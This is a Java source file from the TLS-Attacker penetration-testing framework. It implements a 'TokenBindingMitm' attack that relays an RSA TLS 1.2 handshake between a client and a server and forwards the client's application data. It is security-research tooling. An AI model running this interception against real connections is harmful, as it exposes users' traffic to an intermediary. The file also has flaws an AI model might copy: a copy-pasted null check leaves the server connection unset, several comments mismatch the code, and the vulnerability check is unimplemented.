/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS
 *
 * Copyright 2014-2017 Ruhr University Bochum / Hackmanit GmbH
 *
 * Licensed under Apache License 2.0
 * http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.tlsattacker.attacks.impl;

import de.rub.nds.tlsattacker.attacks.config.TokenBindingMitmCommandConfig;
import de.rub.nds.tlsattacker.core.config.Config;
import de.rub.nds.tlsattacker.core.connection.AliasedConnection;
import de.rub.nds.tlsattacker.core.connection.InboundConnection;
import de.rub.nds.tlsattacker.core.connection.OutboundConnection;
import de.rub.nds.tlsattacker.core.protocol.message.ApplicationMessage;
import de.rub.nds.tlsattacker.core.protocol.message.CertificateMessage;
import de.rub.nds.tlsattacker.core.protocol.message.ChangeCipherSpecMessage;
import de.rub.nds.tlsattacker.core.protocol.message.ClientHelloMessage;
import de.rub.nds.tlsattacker.core.protocol.message.FinishedMessage;
import de.rub.nds.tlsattacker.core.protocol.message.ProtocolMessage;
import de.rub.nds.tlsattacker.core.protocol.message.RSAClientKeyExchangeMessage;
import de.rub.nds.tlsattacker.core.protocol.message.ServerHelloDoneMessage;
import de.rub.nds.tlsattacker.core.protocol.message.ServerHelloMessage;
import de.rub.nds.tlsattacker.core.state.State;
import de.rub.nds.tlsattacker.core.workflow.DefaultWorkflowExecutor;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.core.workflow.action.ForwardAction;
import de.rub.nds.tlsattacker.core.workflow.action.MessageAction;
import de.rub.nds.tlsattacker.core.workflow.action.ReceiveAction;
import de.rub.nds.tlsattacker.core.workflow.action.SendAction;
import java.util.LinkedList;
import java.util.List;

public class TokenBindingMitm extends Attacker<TokenBindingMitmCommandConfig> {

    public TokenBindingMitm(TokenBindingMitmCommandConfig config) {
        super(config);

    }

    @Override
    public void executeAttack() {

        Config conf = config.createConfig();
        conf.setQuickReceive(true);

        AliasedConnection clientCon = conf.getDefaultClientConnection();
        AliasedConnection serverCon = conf.getDefaultServerConnection();

        if (clientCon == null) {
            LOGGER.debug("Client default connection not set in config, creating new one");
            clientCon = new OutboundConnection();
            clientCon.setAlias("clientToMitm");
        }
        if (clientCon == null) {
            LOGGER.debug("Server default connection not set in config, creating new one");
            clientCon = new InboundConnection();
            clientCon.setAlias("mitmToServer");
        }

        WorkflowTrace trace = new WorkflowTrace();
        trace.addConnection(clientCon);
        trace.addConnection(serverCon);
        String clientConAlias = clientCon.getAlias();
        String serverConAlias = serverCon.getAlias();

        // Build a simple rsa TLS 1.2 workflow (no ephemeral KE, no client auth)
        // from client
        MessageAction action = new ReceiveAction(new ClientHelloMessage(conf));
        action.setConnectionAlias(clientConAlias);
        trace.addTlsAction(action);

        // to server
        action = new SendAction(new ClientHelloMessage(conf));
        action.setConnectionAlias(serverConAlias);
        trace.addTlsAction(action);

        // from client
        List<ProtocolMessage> messages = new LinkedList<>();
        messages.add(new ServerHelloMessage(conf));
        messages.add(new CertificateMessage(conf));
        messages.add(new ServerHelloDoneMessage(conf));
        action = new SendAction(messages);
        action.setConnectionAlias(clientConAlias);
        trace.addTlsAction(action);

        // to server
        messages = new LinkedList<>();
        messages.add(new ServerHelloMessage(conf));
        messages.add(new CertificateMessage(conf));
        messages.add(new ServerHelloDoneMessage(conf));
        action = new ReceiveAction(messages);
        action.setConnectionAlias(serverConAlias);
        trace.addTlsAction(action);

        // from client
        messages = new LinkedList<>();
        messages.add(new RSAClientKeyExchangeMessage(conf));
        messages.add(new ChangeCipherSpecMessage(conf));
        messages.add(new FinishedMessage(conf));
        action = new ReceiveAction(messages);
        action.setConnectionAlias(clientConAlias);
        trace.addTlsAction(action);

        // to server
        messages = new LinkedList<>();
        messages.add(new RSAClientKeyExchangeMessage(conf));
        messages.add(new ChangeCipherSpecMessage(conf));
        messages.add(new FinishedMessage(conf));
        action = new SendAction(messages);
        action.setConnectionAlias(serverConAlias);
        trace.addTlsAction(action);

        // to client
        messages = new LinkedList<>();
        messages.add(new ChangeCipherSpecMessage(conf));
        messages.add(new FinishedMessage(conf));
        action = new SendAction(messages);
        action.setConnectionAlias(clientConAlias);
        trace.addTlsAction(action);

        ApplicationMessage appMsg = new ApplicationMessage(conf);
        ForwardAction f = new ForwardAction();
        f.setMessages(appMsg);
        f.setReceiveFromAlias(clientConAlias);
        f.setForwardToAlias(serverConAlias);
        trace.addTlsAction(f);

        State state = new State(conf, trace);
        WorkflowExecutor workflowExecutor;
        workflowExecutor = new DefaultWorkflowExecutor(state);
        LOGGER.info("Executing workflow");
        workflowExecutor.executeWorkflow();
    }

    @Override
    public Boolean isVulnerable() {
        throw new UnsupportedOperationException("Not supported yet.");
    }
}
